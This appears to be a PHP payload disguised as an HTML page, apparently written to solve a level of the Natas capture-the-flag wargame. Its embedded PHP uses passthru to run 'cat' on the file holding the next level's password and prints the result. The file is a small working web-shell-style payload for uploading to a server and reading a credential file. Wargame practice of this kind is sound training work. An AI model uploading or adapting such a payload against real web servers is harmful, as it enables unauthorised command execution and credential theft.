<html>

<head>

<body>
    <h1>Natas13 Password</h1>
    <div id="content">
        <?
        $password = passthru('cat /etc/natas_webpass/natas13');
        echo "The next level password is $password";
        ?>
    </div>
</body>

</html>
